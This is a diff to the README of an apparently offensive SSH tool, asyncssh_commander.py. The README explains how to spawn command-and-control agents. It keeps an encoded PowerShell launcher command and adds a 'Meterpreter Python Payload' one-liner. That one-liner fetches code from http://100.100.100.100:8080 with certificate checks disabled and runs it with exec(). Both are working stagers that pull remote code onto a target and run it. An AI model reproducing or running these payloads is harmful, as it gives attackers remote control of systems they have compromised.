@@ -49,7 +49,11 @@ ___
 Spawn another C2 agent (Powershell-Empire, Meterpreter, etc):
 
 `python3 asyncssh_commander.py "powershell.exe -e ABJe...dhYte"`
-  
+
+Meterpreter Python Payload
+
+`python3 asyncssh_commander.py "python3 -c \"import sys; import ssl; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]], fromlist=('urlopen',)); r=u.urlopen('http://100.100.100.100:8080/YnrVekAsVF', context=ssl._create_unverified_context()); exec(r.read());\""` 
+
 ___    
   
 Get list of active tunnels:
